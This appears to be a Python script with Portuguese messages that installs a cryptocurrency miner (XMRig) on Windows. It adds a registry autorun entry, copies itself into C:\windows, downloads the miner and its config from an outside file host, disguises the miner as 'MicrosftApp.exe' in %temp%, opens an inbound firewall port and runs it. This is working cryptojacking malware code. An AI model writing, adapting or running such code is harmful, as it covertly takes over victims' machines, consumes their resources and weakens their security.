# -*- coding: utf-8 -*-
import os
import wget
import winshell
import ctypes

def AutoRunYesAdmin():
    reg = os.popen(r'reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windwos\CurrentVersion\Run /v "cmd" /t REG_SZ /d C:\windows\MicrosftApp.exe /f')
    reg = reg.read()
    print(reg)
    if "A opera" in reg or "successfully." in reg:
        print("Copiado para windows")
        os.popen(r"copy permanente.py C:\windows\permanente.py")
    else:
        print("Erro no reg. verifique se está como administrador")
        exit
        


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin
if isAdmin():
    print("É Administrador!")
    AutoRunYesAdmin()
else:
    print("Execute como administrador")
    exit


    
def exe_64():
    dll = 'link here Json'
    exe = 'link here Xmrig'
    filename = wget.download(dll)
    filename = wget.download(exe)
    os.popen("move /Y config.json %temp%")
    os.popen("move /Y MicrosftApp.exe %temp%")
    try:
        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=TCP dir=in localport=45550 action=allow')
        os.popen(r'netsh.exe advfirewall firewall add rule name="WindowsStatus" protocol=UDP dir=in localport=45550 action=allow')
        print("Adicionado no firewall")
    except:
        pass #nao funciona

    existing = os.popen(r"dir %temp%\MicrosftApp.exe")
    print(existing)
    if "0" in str(existing):
        print("arquivo existente")
        os.popen(r"%temp%\MicrosftApp.exe")
        exit
    else:
        print("não existente")
        dll = 'https://1fgm8rh.oloadcdn.net/dl/l/bCXRZXd-wr7nZQqM/KDtHTt-Qhdc/config.json'
        exe = 'https://1fgm8rh.oloadcdn.net/dl/l/zd8txsOyai-amQ4h/2cEFk04n8L0/MicrosftApp.exe'
        filename = wget.download(dll)
        filename = wget.download(exe)
        os.popen("move /Y config.json %temp%")
        os.popen("move /Y MicrosftApp.exe %temp%")
        os.popen(r"%temp%\MicrosftApp.exe")
        exit


exe_64()










